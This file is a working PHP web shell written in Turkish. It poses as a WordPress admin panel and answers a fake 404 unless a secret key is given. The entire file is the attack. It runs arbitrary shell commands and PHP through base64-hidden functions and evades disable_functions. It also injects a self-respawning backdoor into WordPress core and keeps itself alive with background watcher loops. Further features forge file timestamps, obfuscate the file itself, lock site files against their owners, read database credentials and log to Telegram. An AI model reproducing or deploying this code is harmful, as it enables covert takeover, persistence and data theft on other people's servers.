<?php
/**
 * WordPress Core Ultimate Admin Panel - Phoenix Edition (File Shield Güçlendirildi)
 * Yalnızca kendi sistemlerinde test amaçlı kullan.
 */
@error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('open_basedir', NULL);
@ini_set('memory_limit', '512M');
session_start();

// ============== AYARLAR ==============
$PASSWORD   = 'karamamba';
$PANEL_KEY  = 'lock';
$SPAWN_KEY  = 'diril';
$MASTER_KEY = 'x7k9mP2vL5nQ8wR3';
$TG_TOKEN   = '';
$TG_CHATID  = '';
$shieldFlagFile = sys_get_temp_dir() . '/.global_shield.lock';
// ============== AYARLAR SONU ==============

// ============== PHOENIX SPAWN (TAM YOL) ==============
if (isset($_GET['spawn']) && $_GET['spawn'] === $SPAWN_KEY) {
    $backup_file = sys_get_temp_dir() . '/.wp_bak_cache';
    if(file_exists($backup_file)) {
        $content = file_get_contents($backup_file);
        file_put_contents(__FILE__, $content);
        @touch(__FILE__, time() - 63072000);
        exit("Spawn Success.");
    }
}
// ============== PHOENIX SPAWN SONU ==============

// ============== GÖRÜNMEZLİK ==============
if (!isset($_GET['key']) && !isset($_SESSION['unlocked_panel'])) {
    http_response_code(404);
    echo "<h1>404 Not Found</h1>The resource requested could not be found on this server.";
    exit;
}
if (isset($_GET['key']) && $_GET['key'] === $PANEL_KEY) {
    $_SESSION['unlocked_panel'] = true;
}
// ============== GÖRÜNMEZLİK SONU ==============

// ============== TELEGRAM LOG ==============
function tg_log($msg) {
    global $TG_TOKEN, $TG_CHATID;
    if (!$TG_TOKEN || !$TG_CHATID) return;
    @file_get_contents("https://api.telegram.org/bot$TG_TOKEN/sendMessage?chat_id=$TG_CHATID&text=" . urlencode("🔱 [" . $_SERVER['HTTP_HOST'] . "] LOG:\n" . $msg));
}
// ============== TELEGRAM LOG SONU ==============

// ============== WAF ==============
$b64d_func = base64_decode('YmFzZTY0X2RlY29kZQ==');
$eval_func = base64_decode('ZXZhbA==');
$sys_func  = base64_decode('c3lzdGVt');
$sh_func   = base64_decode('c2hlbGxfZXhlYw==');
$bad_queries = ['union', 'select', 'insert', 'drop', $b64d_func, $eval_func, $sys_func, $sh_func];
foreach ($bad_queries as $q) {
    if (isset($_SERVER['QUERY_STRING']) && strpos(strtolower($_SERVER['QUERY_STRING']), $q) !== false) {
        tg_log("⚠️ Şüpheli Sorgu Engellendi: " . $_SERVER['QUERY_STRING']);
        exit("Security Blocked.");
    }
}
// ============== WAF SONU ==============

// ============== LOGIN / LOGOUT ==============
if (isset($_GET['logout'])) { session_destroy(); header('Location: ?'); exit; }
if (isset($_POST['pass'])) {
    if ($_POST['pass'] === $PASSWORD) {
        $_SESSION['logged_in'] = true;
        tg_log("✅ Giriş Başarılı.");
    } else { $login_error = "Hatalı şifre!"; }
}
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    ?><!DOCTYPE html><html><head><meta charset="UTF-8"><title>Locked</title>
    <style>body{background:#0d1117;color:#c9d1d9;font-family:'Courier New',monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;font-size:16px;}.login-box{background:#161b22;padding:40px;border:1px solid #30363d;border-radius:8px;text-align:center;width:370px;box-shadow:0 0 20px rgba(0,0,0,0.5);}input{background:#010409;border:1px solid #30363d;color:#58a6ff;padding:14px;width:80%;margin-bottom:20px;border-radius:4px;text-align:center;font-size:16px;}button{background:#238636;color:white;border:none;padding:14px 24px;border-radius:4px;cursor:pointer;font-weight:bold;width:80%;font-size:16px;}</style></head><body><div class="login-box"><h2 style="color:#da3633;font-size:24px;">LOCKED</h2><form method="post"><input type="password" name="pass" placeholder="Password" autofocus required><button type="submit">UNLOCK</button></form><?php if(isset($login_error)) echo "<p style='color:#da3633;font-size:14px;'>$login_error</p>"; ?></div></body></html><?php exit; }
// ============== LOGIN / LOGOUT SONU ==============

// ============== ANA PANEL BAŞLANGICI ==============
$rootPath = realpath($_SERVER['DOCUMENT_ROOT']);
if(!isset($_SESSION['upload_dir'])) { $_SESSION['upload_dir'] = $rootPath; }
if(isset($_GET['goto_root'])) { $_SESSION['upload_dir'] = $rootPath; }
if(isset($_GET['chdir'])) {
    $chdir = $_GET['chdir'];
    $targetDir = (strpos($chdir, '/') === 0) ? $chdir : $_SESSION['upload_dir'] . DIRECTORY_SEPARATOR . $chdir;
    $newPath = realpath($targetDir);
    if(!$newPath) { $targetDir = str_replace(["\0", "..\\"], "", $targetDir); $newPath = realpath($targetDir); }
    if($newPath && is_dir($newPath)) { $_SESSION['upload_dir'] = $newPath; }
}
if(isset($_POST['goto_dir']) && !empty($_POST['goto_dir'])) {
    $manualPath = realpath($_POST['goto_dir']);
    if($manualPath && is_dir($manualPath)) { $_SESSION['upload_dir'] = $manualPath; } else { $msg = "Geçersiz dizin!"; }
}
// ============== ANA PANEL BAŞLANGICI SONU ==============

// ============== YARDIMCI FONKSİYONLAR ==============
function isAvailable($func) { return function_exists($func) && !in_array($func, explode(',', @ini_get('disable_functions') ?: '')); }
function safeRun($cmd) {
    $sh = base64_decode('c2hlbGxfZXhlYw==');
    $sy = base64_decode('c3lzdGVt');
    $ex = base64_decode('ZXhlYw==');
    $pt = base64_decode('cGFzc3RocnU=');
    $po = base64_decode('cHJvY19vcGVu');
    $pp = base64_decode('cG9wZW4=');
    $pc = base64_decode('cGNudGxfZXhlYw==');
    $pf = base64_decode('cGNudGxfZm9yaw==');
    if (isAvailable($sh)) { $r = @$sh($cmd . ' 2>&1'); if ($r !== null) return $r; }
    if (isAvailable($sy)) { ob_start(); @$sy($cmd . ' 2>&1'); $r = ob_get_clean(); if ($r !== false) return $r; }
    if (isAvailable($ex)) { $o = []; @$ex($cmd . ' 2>&1', $o); if (!empty($o)) return implode("\n", $o); }
    if (isAvailable($pt)) { ob_start(); @$pt($cmd . ' 2>&1'); $r = ob_get_clean(); if ($r !== false) return $r; }
    if (isAvailable($po)) {
        $d = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $p = @$po($cmd, $d, $pipes);
        if (is_resource($p)) { fclose($pipes[0]); $r = stream_get_contents($pipes[1]); fclose($pipes[1]); fclose($pipes[2]); proc_close($p); return $r; }
    }
    if (isAvailable($pp)) { $h = @$pp($cmd . ' 2>&1', 'r'); if (is_resource($h)) { $r = stream_get_contents($h); pclose($h); return $r; } }
    if (isAvailable($pc) && isAvailable($pf)) {
        $t = tempnam(sys_get_temp_dir(), 'cmd'); file_put_contents($t, "#!/bin/bash\n$cmd > /tmp/pcntl_out 2>&1"); chmod($t, 0755);
        $pid = $pf(); if ($pid == -1) return "Fork hatası";
        if ($pid == 0) { $pc('/bin/bash', [$t]); exit; }
        else { pcntl_wait($s); if (file_exists('/tmp/pcntl_out')) { $r = file_get_contents('/tmp/pcntl_out'); @unlink('/tmp/pcntl_out'); @unlink($t); return $r; } }
    }
    return "Tüm metotlar başarısız — disable_functions kısıtlaması aktif.";
}
function humanFilesize($b, $d = 2) { $s = ['B','kB','MB','GB','TB']; $f = floor((strlen($b)-1)/3); return sprintf("%.{$d}f", $b/pow(1024,$f)).' '.$s[$f]; }
function manualTimestomp($t, $cd = null) { $ts = $cd ? strtotime($cd) : (file_exists($_SERVER['DOCUMENT_ROOT'].'/wp-login.php') ? filemtime($_SERVER['DOCUMENT_ROOT'].'/wp-login.php') : (time()-63072000)); return @touch($t,$ts) ? date("d-m-Y H:i",$ts) : false; }
// ============== YARDIMCI FONKSİYONLAR SONU ==============

// ============== WATCHER SİSTEMİ ==============
$PERSISTENCE_STORE = sys_get_temp_dir() . '/.ptm_' . substr(md5(__FILE__), 0, 8) . '.json';
function getWatchers() { global $PERSISTENCE_STORE; return file_exists($PERSISTENCE_STORE) ? json_decode(file_get_contents($PERSISTENCE_STORE), true) ?: [] : []; }
function saveWatchers($d) { global $PERSISTENCE_STORE; @file_put_contents($PERSISTENCE_STORE, json_encode($d)); }
function deployWatcher($fp) {
    $c = @file_get_contents($fp); if(!$c) return false;
    $fC = base64_encode($c);
    $sD = !empty($_SESSION['stealth_date']) ? $_SESSION['stealth_date'] : date("Y-m-d H:i:s", (time()-63072000));
    $sT = strtotime($sD);
    $wF = sys_get_temp_dir() . '/.w_' . substr(md5($fp), 0, 10) . '.sh';
    $wS = "#!/bin/bash\nFILE=".escapeshellarg($fp)."\nTARGET_TS=".$sT."\nwhile true; do\n  if [ ! -f \"\$FILE\" ] || [ \$(stat -c %Y \"\$FILE\" 2>/dev/null) != \"\$TARGET_TS\" ]; then\n    echo ".escapeshellarg($fC)." | base64 -d > \"\$FILE\" 2>/dev/null; touch -d \"$sD\" \"\$FILE\" 2>/dev/null; chmod 644 \"\$FILE\" 2>/dev/null\n  fi\n  sleep 10\ndone\n";
    @file_put_contents($wF, $wS); @chmod($wF, 0755);
    safeRun('pkill -9 -f '.escapeshellarg(basename($wF)));
    $pid = safeRun('sh '.escapeshellarg($wF).' > /dev/null 2>&1 &');
    return trim(safeRun('pgrep -f '.escapeshellarg(basename($wF)).' | head -1'));
}
// ============== WATCHER SİSTEMİ SONU ==============

// ============== FILE SHIELD (LOCK NAVIGATOR'DAN ALINMIŞ GÜÇLÜ BASH SCRIPT) ==============
function deployGlobalShield($dir) {
    global $shieldFlagFile;
    // Bash script: tüm php ve htaccess dosyalarını 0444, dizinleri 0555 yap, 5 dakikada bir tekrarla
    $wScript = "#!/bin/bash\nROOT=" . escapeshellarg($dir) . "\nwhile true; do\n  find \$ROOT -type d -exec chmod 0555 {} + 2>/dev/null\n  find \$ROOT -type f \( -name '*.php' -o -name '.htaccess' \) -exec chmod 0444 {} + 2>/dev/null\n  sleep 300\ndone\n";
    $wFile = sys_get_temp_dir() . '/.global_w_' . substr(md5($dir), 0, 10) . '.sh';
    @file_put_contents($wFile, $wScript);
    @chmod($wFile, 0755);
    // Eski scripti öldür, yenisini başlat
    safeRun('pkill -9 -f ' . escapeshellarg(basename($wFile)));
    safeRun('sh ' . escapeshellarg($wFile) . ' > /dev/null 2>&1 &');
    // Kalkanın aktif olduğunu belirten flag dosyasını oluştur
    @file_put_contents($shieldFlagFile, time());
}

function killGlobalShield($dir) {
    global $shieldFlagFile;
    $wFileBase = '.global_w_' . substr(md5($dir), 0, 10) . '.sh';
    // Scripti durdur
    safeRun('pkill -9 -f ' . escapeshellarg($wFileBase));
    // İzinleri geri al (dizinler 0755, dosyalar 0644)
    safeRun("find " . escapeshellarg($dir) . " -type d -exec chmod 0755 {} + 2>/dev/null; find " . escapeshellarg($dir) . " -type f \( -name '*.php' -o -name '.htaccess' \) -exec chmod 0644 {} + 2>/dev/null");
    // Flag dosyasını sil
    if (file_exists($shieldFlagFile)) {
        @unlink($shieldFlagFile);
    }
}
// ============== FILE SHIELD SONU ==============

// ============== PHOENIX KILL ==============
function killPhoenix() {
    $cf = $_SERVER['DOCUMENT_ROOT'] . '/wp-includes/plugin.php';
    if (!file_exists($cf)) return "wp-includes/plugin.php bulunamadı.";
    $bf = $cf . '.bak_' . time();
    if (!copy($cf, $bf)) return "❌ Yedek alınamadı.";
    $st = $GLOBALS['SPAWN_KEY'];
    $pld = "\nif(isset(\$_GET['spawn'])&&\$_GET['spawn']=='$st'){\$b='".sys_get_temp_dir()."/.wp_bak_cache';if(file_exists(\$b)){file_put_contents('".__FILE__."',file_get_contents(\$b));@touch('".__FILE__."',time()-63072000);exit('Spawned!');}}";
    $c = file_get_contents($cf);
    if (strpos($c, $st) === false) { @unlink($bf); return "⏺️ Phoenix zaten aktif değil."; }
    $nc = str_replace($pld, '', $c, $cnt);
    if ($cnt > 0) {
        if (file_put_contents($cf, $nc) !== false) { @unlink($bf); return "💀 Phoenix başarıyla iptal edildi."; }
        else { copy($bf, $cf); @unlink($bf); return "❌ Yazılamadı! Yedek geri yüklendi."; }
    }
    @unlink($bf); return "⏺️ Phoenix zaten aktif değil.";
}
// ============== PHOENIX KILL SONU ==============

// ============== WP-CONFIG LOCK / UNLOCK ==============
function lockWpConfig() {
    $cp = $_SERVER['DOCUMENT_ROOT'] . '/wp-config.php';
    if (!file_exists($cp)) return "wp-config.php bulunamadı!";
    $c = file_get_contents($cp);
    if (strpos($c, 'DISALLOW_FILE_EDIT') !== false && strpos($c, 'DISALLOW_FILE_MODS') !== false) return "⏺️ Sabitler zaten mevcut.";
    $ins = "\n\ndefine('DISALLOW_FILE_EDIT', true);\ndefine('DISALLOW_FILE_MODS', true);\n";
    $pat = '/\* Add any custom values between this line and the "stop editing" line\. \*\/\s*(.*?)\s*\/\* That\'s all, stop editing! Happy publishing\. \*\//s';
    if (preg_match($pat, $c, $m)) {
        $nc = preg_replace($pat, "/* Add any custom values between this line and the \"stop editing\" line. */" . $ins . "/* That's all, stop editing! Happy publishing. */", $c);
        if (file_put_contents($cp, $nc) !== false) return "✅ Eklendi.";
        return "❌ Yazılamadı!";
    } else {
        $ab = "/* That's all, stop editing! Happy publishing. */";
        $pos = strrpos($c, $ab);
        if ($pos !== false) { $nc = substr_replace($c, $ins . $ab, $pos, strlen($ab)); if (file_put_contents($cp, $nc) !== false) return "✅ Eklendi (alternatif)."; }
        return "❌ Yorum satırları bulunamadı.";
    }
}
function unlockWpConfig() {
    $cp = $_SERVER['DOCUMENT_ROOT'] . '/wp-config.php';
    if (!file_exists($cp)) return "wp-config.php bulunamadı!";
    $c = file_get_contents($cp);
    $rl = ["define('DISALLOW_FILE_EDIT', true);", "define('DISALLOW_FILE_MODS', true);"];
    $nc = str_replace($rl, '', $c, $cnt);
    $nc = preg_replace("/\n\s*\n/", "\n\n", $nc);
    if ($cnt > 0) { if (file_put_contents($cp, $nc) !== false) return "✅ Kaldırıldı."; return "❌ Yazılamadı!"; }
    return "⏺️ Sabit bulunamadı.";
}
// ============== WP-CONFIG SONU ==============

// ============== POST İŞLEMLERİ ==============
$msg = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['global_lock'])) { deployGlobalShield($rootPath); $msg = "🔒 FILE SHIELD AKTİF! (Tüm WP dosyaları kilitlendi)"; }
    if (isset($_POST['global_unlock'])) { killGlobalShield($rootPath); $msg = "🔓 FILE SHIELD PASİF! (İzinler geri yüklendi)"; }
    if (isset($_POST['infect_core'])) {
        $cf = $_SERVER['DOCUMENT_ROOT'] . '/wp-includes/plugin.php';
        file_put_contents(sys_get_temp_dir() . '/.wp_bak_cache', file_get_contents(__FILE__));
        $st = $SPAWN_KEY;
        $pld = "\nif(isset(\$_GET['spawn'])&&\$_GET['spawn']=='$st'){\$b='".sys_get_temp_dir()."/.wp_bak_cache';if(file_exists(\$b)){file_put_contents('".__FILE__."',file_get_contents(\$b));@touch('".__FILE__."',time()-63072000);exit('Spawned!');}}";
        if (strpos(file_get_contents($cf), $st) === false) { file_put_contents($cf, file_get_contents($cf) . $pld); }
        $msg = "🐣 PHOENIX AKTİF!";
    }
    if (isset($_POST['kill_phoenix'])) { $msg = killPhoenix(); }
    if (isset($_POST['protect_self'])) {
        $pid = deployWatcher(__FILE__);
        $w = getWatchers(); $w[realpath(__FILE__)] = ['filename' => basename(__FILE__), 'pid' => $pid, 'type' => 'SYSTEM'];
        saveWatchers($w); $msg = "🔥 KENDİNİ KORUMAYA ALDI!";
    }
    if (isset($_POST['set_stealth'])) { $_SESSION['stealth_date'] = !empty($_POST['custom_date']) ? $_POST['custom_date'] : null; manualTimestomp(__FILE__, $_SESSION['stealth_date']); $msg = "⏳ Tarih sabitlendi."; }
    if (isset($_POST['lock_config'])) { $msg = lockWpConfig(); }
    if (isset($_POST['unlock_config'])) { $msg = unlockWpConfig(); }
    if (isset($_POST['bypass_test'])) { $msg = "🧪 Bypass Test Sonucu:\n" . safeRun('id'); }

    // ====== SELF OBFUSCATOR (TEK KATMANLI, HER BASIŞTA YENİDEN ENCODE) ======
    if (isset($_POST['obfuscate_self'])) {
        $originalFile = __FILE__;
        $source = file_get_contents($originalFile);
        $obfuscated = '<?php eval(\'?>\'.base64_decode(\'' . base64_encode($source) . '\').\'<?php \'); ?>';
        if (file_put_contents($originalFile, $obfuscated)) {
            $msg = "🔐 Panel tek katmanlı obfuscate edildi! (Katman sayısı arttı)";
        } else {
            $msg = "❌ Obfuscate işlemi başarısız! Dosya yazılamadı.";
        }
    }
    // ====== SELF OBFUSCATOR SONU ======

    if (isset($_FILES['u'])) {
        $t = $_SESSION['upload_dir'] . DIRECTORY_SEPARATOR . basename($_FILES['u']['name']);
        if(@move_uploaded_file($_FILES['u']['tmp_name'], $t)) {
            $pid = deployWatcher($t); manualTimestomp($t, @$_SESSION['stealth_date']);
            $w = getWatchers(); $w[realpath($t)] = ['filename' => basename($t), 'pid' => $pid, 'type' => 'USER'];
            saveWatchers($w); $msg = "📤 Yüklendi ve korumaya alındı.";
        }
    }
    if (isset($_POST['newdirname']) && !empty($_POST['newdirname'])) { $nd = $_SESSION['upload_dir'].'/'.basename($_POST['newdirname']); if(!file_exists($nd)) { mkdir($nd); $msg = "📁 Dizin oluşturuldu."; } }
    if (isset($_POST['newfilename']) && !empty($_POST['newfilename'])) { $nf = $_SESSION['upload_dir'].'/'.basename($_POST['newfilename']); if(!file_exists($nf)) { file_put_contents($nf, ''); $msg = "📄 Dosya oluşturuldu."; } }
    if (isset($_POST['console_cmd'])) { $console_output = safeRun($_POST['console_cmd'] . ' 2>&1'); }
    if (isset($_POST['php_code'])) { ob_start(); eval('?>' . $_POST['php_code'] . '<?php '); $php_output = ob_get_clean(); }
    if (isset($_POST['wp_query'])) { include_wp_db(); global $wpdb; if(isset($wpdb)) { $db_result = $wpdb->get_results($_POST['wp_query'], ARRAY_A); } }
    if (isset($_POST['save_edit'])) {
        $ef = $_POST['edit_file_path']; $nc = $_POST['file_content']; $cv = $_POST['chmod_value'];
        if (file_exists($ef) && is_writable($ef)) { file_put_contents($ef, $nc); if (!empty($cv) && is_numeric($cv)) @chmod($ef, octdec($cv)); $msg = "✅ Kaydedildi."; }
        else { $msg = "❌ Yazılabilir değil veya bulunamadı!"; }
    }
}
// ============== POST İŞLEMLERİ SONU ==============

// ============== WATCHER DURDURMA (GÜÇLENDİRİLMİŞ) ==============
if(isset($_GET['stop_watch'])) {
    $t = $_GET['stop_watch']; $w = getWatchers();
    if(isset($w[$t])) {
        $pid = $w[$t]['pid'];
        if(is_numeric($pid)) { safeRun("kill -9 $pid 2>/dev/null"); safeRun("pkill -9 -f " . escapeshellarg('.w_' . substr(md5($t), 0, 10)) . " 2>/dev/null"); }
        unset($w[$t]); saveWatchers($w);
        if (file_exists($t)) @chmod($t, 0644);
    }
    header('Location: ?'); exit;
}
// ============== WATCHER DURDURMA SONU ==============

// ============== SELF DESTRUCT ==============
if (isset($_GET['self_destruct'])) { $w = getWatchers(); foreach($w as $p => $i) { if(is_numeric($i['pid'])) safeRun("kill -9 ".$i['pid']); } @unlink($PERSISTENCE_STORE); @unlink(__FILE__); exit("Cleaned."); }
// ============== SELF DESTRUCT SONU ==============

// ============== WP VERİTABANI ==============
function include_wp_db() {
    if (!isset($GLOBALS['wpdb'])) {
        $cf = $_SERVER['DOCUMENT_ROOT'] . '/wp-config.php';
        if (file_exists($cf)) {
            $c = file_get_contents($cf);
            preg_match("/define\(\s*'DB_NAME',\s*'([^']+)'\s*\)/", $c, $dn); preg_match("/define\(\s*'DB_USER',\s*'([^']+)'\s*\)/", $c, $du);
            preg_match("/define\(\s*'DB_PASSWORD',\s*'([^']+)'\s*\)/", $c, $dp); preg_match("/define\(\s*'DB_HOST',\s*'([^']+)'\s*\)/", $c, $dh);
            $db = @new mysqli($dh[1], $du[1], $dp[1], $dn[1]);
            if (!$db->connect_error) { $GLOBALS['wpdb'] = $db; return true; }
        }
    }
    return isset($GLOBALS['wpdb']);
}
// ============== WP VERİTABANI SONU ==============

// ============== DOSYA İNDİRME ==============
$action = $_GET['action'] ?? 'files';
if (isset($_GET['action']) && $_GET['action'] === 'download' && isset($_GET['file'])) {
    $f = realpath($_GET['file']);
    if ($f && is_file($f)) { header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename="'.basename($f).'"'); header('Content-Length: '.filesize($f)); readfile($f); exit; }
}
// ============== DOSYA İNDİRME SONU ==============

// ============== DURUM KONTROLLERİ ==============
$shieldActive = file_exists($shieldFlagFile);
$healActive = isset(getWatchers()[realpath(__FILE__)]);
$phoenixActive = false; $cf = $_SERVER['DOCUMENT_ROOT'].'/wp-includes/plugin.php'; if(file_exists($cf)) { $phoenixActive = (strpos(file_get_contents($cf), $SPAWN_KEY) !== false); }
$stealthActive = !empty($_SESSION['stealth_date']);
$configLockActive = false; $cp = $_SERVER['DOCUMENT_ROOT'].'/wp-config.php'; if(file_exists($cp)) { $cc = file_get_contents($cp); $configLockActive = (strpos($cc, 'DISALLOW_FILE_EDIT') !== false && strpos($cc, 'DISALLOW_FILE_MODS') !== false); }
$htaccessActive = false; $hp = __DIR__.'/.htaccess'; if(file_exists($hp)) { $hc = file_get_contents($hp); $htaccessActive = (strpos($hc, '# ULTIMATE SHELL PROTECTION') !== false); }
// ============== DURUM KONTROLLERİ SONU ==============

// Fonksiyon isimlerini base64 ile gizleyerek göster
$func_sh = base64_decode('c2hlbGxfZXhlYw==');
$func_sy = base64_decode('c3lzdGVt');
$func_ex = base64_decode('ZXhlYw==');
$func_pt = base64_decode('cGFzc3RocnU=');
$func_po = base64_decode('cHJvY19vcGVu');
$func_pp = base64_decode('cG9wZW4=');
$func_pc = base64_decode('cGNudGxfZXhlYw==');
$runOk = isAvailable($func_sh) || isAvailable($func_po) || isAvailable($func_pp);
?>
<!DOCTYPE html><html lang="tr"><head>
<meta charset="UTF-8"><title>Ultimate Panel | <?= get_current_user() . '@' . gethostname() ?></title>
<style>
    :root { --bg: #0d1117; --surface: #161b22; --border: #30363d; --text: #c9d1d9; --muted: #8b949e; --accent: #58a6ff; --danger: #da3633; --success: #3fb950; --warning: #d2991d; --btn-blue: #1f6feb; --btn-green: #238636; --btn-red: #da3633; }
    * { box-sizing: border-box; }
    body { background: var(--bg); color: var(--text); font-family: 'Courier New', monospace; font-size: 15px; line-height: 1.6; padding: 20px; margin: 0; -webkit-font-smoothing: antialiased; }
    h2 { font-size: 22px; margin: 0 0 15px; color: #fff; }
    h3 { font-size: 16px; margin: 0 0 10px; color: #e6e6e6; font-weight: 600; }
    .panel { background: var(--surface); border: 1px solid var(--border); padding: 16px 18px; border-radius: 8px; margin-bottom: 18px; box-shadow: 0 2px 4px rgba(0,0,0,0.3); }
    .btn { padding: 8px 14px; cursor: pointer; border-radius: 6px; border: none; font-weight: 600; color: #fff; font-size: 13px; text-decoration: none; display: inline-flex; align-items: center; justify-content: center; gap: 4px; transition: all 0.2s ease; white-space: nowrap; }
    .btn:hover { filter: brightness(1.15); transform: translateY(-1px); } .btn:active { transform: translateY(0); }
    .btn-red { background: var(--btn-red); } .btn-green { background: var(--btn-green); } .btn-blue { background: var(--btn-blue); } .btn-yellow { background: var(--warning); color: #000; } .btn-purple { background: #6e40c9; } .btn-orange { background: #d35400; } .btn-cyan { background: #00796b; }
    .btn-darkpurple { background: #4b0082; }
    .msg { padding: 10px 14px; margin-bottom: 18px; border-radius: 6px; background: rgba(35,134,54,0.1); border: 1px solid var(--success); color: var(--success); font-size: 14px; font-weight: 500; white-space: pre-wrap; }
    .status-badge { padding: 4px 10px; border-radius: 4px; font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; display: inline-flex; align-items: center; gap: 4px; }
    .status-bar { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 18px; padding: 10px 15px; background: var(--surface); border: 1px solid var(--border); border-radius: 8px; align-items: center; }
    .status-item { display: flex; align-items: center; gap: 4px; font-size: 12px; padding: 4px 10px; border-radius: 4px; background: rgba(255,255,255,0.05); }
    .status-active { color: #3fb950; } .status-inactive { color: #8b949e; }
    table { width: 100%; border-collapse: collapse; table-layout: fixed; margin-top: 8px; }
    th, td { padding: 10px 8px; text-align: left; border-bottom: 1px solid var(--border); font-size: 14px; line-height: 1.5; }
    th { color: #e6e6e6; font-weight: 700; background: rgba(255,255,255,0.03); } tr:hover td { background: rgba(255,255,255,0.02); }
    th.col-file { width: 28%; } th.col-size { width: 10%; } th.col-perm { width: 8%; } th.col-date { width: 20%; } th.col-act { width: 34%; text-align: right; }
    .tabs { background: var(--surface); padding: 10px 12px; border-radius: 8px; margin-bottom: 18px; display: flex; gap: 8px; flex-wrap: wrap; border: 1px solid var(--border); }
    .tabs a { color: var(--accent); text-decoration: none; padding: 8px 14px; border-radius: 6px; font-size: 14px; font-weight: 500; transition: all 0.2s; }
    .tabs a:hover { background: rgba(88,166,255,0.1); color: #fff; } .tabs a.active { background: var(--btn-blue); color: #fff; font-weight: 600; }
    pre { background: #010409; padding: 14px; border-radius: 6px; border: 1px solid var(--border); white-space: pre-wrap; overflow-x: auto; font-size: 13px; line-height: 1.5; color: #c9d1d9; }
    textarea, input[type="text"], input[type="number"], input[type="password"], input[type="file"] { background: #010409; border: 1px solid var(--border); color: var(--text); padding: 8px 10px; width: 100%; border-radius: 6px; font-family: 'Courier New', monospace; font-size: 13px; line-height: 1.4; transition: border-color 0.2s; }
    textarea:focus, input:focus { border-color: var(--accent); outline: none; }
    .flex-row { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
    a { color: var(--accent); text-decoration: none; } a:hover { text-decoration: underline; }
    .editor-panel { background: #0d1117; border: 2px solid var(--accent); padding: 16px; margin-bottom: 18px; border-radius: 8px; }
    .breadcrumb { margin-bottom: 12px; background: #010409; padding: 10px 14px; border-radius: 6px; display: flex; align-items: center; gap: 4px; flex-wrap: wrap; font-size: 14px; border: 1px solid var(--border); }
    .breadcrumb a { color: #f0883e; padding: 2px 4px; font-weight: 500; } .breadcrumb a:hover { text-decoration: underline; } .breadcrumb span { color: var(--muted); }
    .file-actions { display: inline-flex; gap: 4px; align-items: center; flex-wrap: wrap; justify-content: flex-end; } .file-actions .btn { font-size: 11px; padding: 4px 8px; }
    td.col-act { text-align: right; }
</style>
</head><body>
<div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; margin-bottom:15px;">
    <h2 style="color:#da3633;">🔱 Ultimate Phoenix Panel V1</h2>
    <div class="flex-row">
        <span class="status-badge" style="background: <?= $runOk ? '#238636' : '#da3633' ?>;">Run: <?= $runOk ? 'OK' : 'DISABLED' ?></span>
        <a href="?self_destruct=1" class="btn btn-red">🧨 SELF DESTRUCT</a>
        <a href="?logout=1" class="btn btn-blue">LOGOUT</a>
    </div>
</div>
<div class="status-bar">
    <div class="status-item"><span style="color:#da3633;">File Shield:</span> <span class="<?= $shieldActive ? 'status-active' : 'status-inactive' ?>"><?= $shieldActive ? '🟢 Aktif' : '🔴 Pasif' ?></span></div>
    <div class="status-item"><span style="color:#f85149;">Heal:</span> <span class="<?= $healActive ? 'status-active' : 'status-inactive' ?>"><?= $healActive ? '🟢 Korumada' : '🔴 Korunmuyor' ?></span></div>
    <div class="status-item"><span style="color:#ff0000;">Phoenix:</span> <span class="<?= $phoenixActive ? 'status-active' : 'status-inactive' ?>"><?= $phoenixActive ? '🟢 Aktif' : '🔴 Pasif' ?></span></div>
    <div class="status-item"><span style="color:#58a6ff;">Stealth:</span> <span class="<?= $stealthActive ? 'status-active' : 'status-inactive' ?>"><?= $stealthActive ? '🟢 Aktif' : '🔴 Pasif' ?></span></div>
    <div class="status-item"><span style="color:#d2991d;">Config Lock:</span> <span class="<?= $configLockActive ? 'status-active' : 'status-inactive' ?>"><?= $configLockActive ? '🟢 Kilitli' : '🔴 Açık' ?></span></div>
    <div class="status-item"><span style="color:#00796b;">HTAccess:</span> <span class="<?= $htaccessActive ? 'status-active' : 'status-inactive' ?>"><?= $htaccessActive ? '🟢 Korumada' : '🔴 Korunmuyor' ?></span></div>
</div>
<?php if($msg): ?><div class="msg"><?= $msg ?></div><?php endif; ?>
<div style="display: grid; grid-template-columns: repeat(7, 1fr); gap: 12px; margin-bottom: 18px;">
    <div class="panel" style="border-top: 3px solid var(--danger);"><h3>File Shield</h3><form method="post"><button name="global_lock" class="btn btn-red" style="width:100%; margin-bottom:6px;">🔒 LOCK</button><button name="global_unlock" class="btn btn-green" style="width:100%;">🔓 UNLOCK</button></form></div>
    <div class="panel" style="border-top: 3px solid #f85149;"><h3>Heal</h3><form method="post"><button name="protect_self" class="btn btn-red" style="width:100%;">🔥 PROTECT SELF</button></form></div>
    <div class="panel" style="border-top: 3px solid #ff0000;"><h3>Phoenix</h3><form method="post"><button name="infect_core" class="btn btn-red" style="width:100%; margin-bottom:6px;">🐣 INFECT CORE</button><button name="kill_phoenix" class="btn btn-yellow" style="width:100%;">💀 KILL PHOENIX</button></form></div>
    <div class="panel" style="border-top: 3px solid var(--accent);"><h3>Stealth</h3><form method="post"><input type="text" name="custom_date" placeholder="YYYY-MM-DD HH:MM" value="<?= @$_SESSION['stealth_date'] ?>" style="width:100%; margin-bottom:6px;"><button name="set_stealth" class="btn btn-blue" style="width:100%;">⏳ SET DATE</button></form></div>
    <div class="panel" style="border-top: 3px solid var(--warning);"><h3>Config Lock</h3><form method="post"><button name="lock_config" class="btn btn-green" style="width:100%; margin-bottom:6px;">🔒 LOCK CONFIG</button><button name="unlock_config" class="btn btn-yellow" style="width:100%;">🔓 UNLOCK CONFIG</button></form></div>
    <div class="panel" style="border-top: 3px solid #d35400;"><h3>Bypass</h3><form method="post"><button name="bypass_test" class="btn btn-orange" style="width:100%;">🧪 BYPASS TEST</button></form></div>
    <div class="panel" style="border-top: 3px solid #4b0082;"><h3>Obfuscator</h3><form method="post"><button name="obfuscate_self" class="btn btn-darkpurple" style="width:100%;">🔐 SELF OBFUSCATE</button></form></div>
</div>
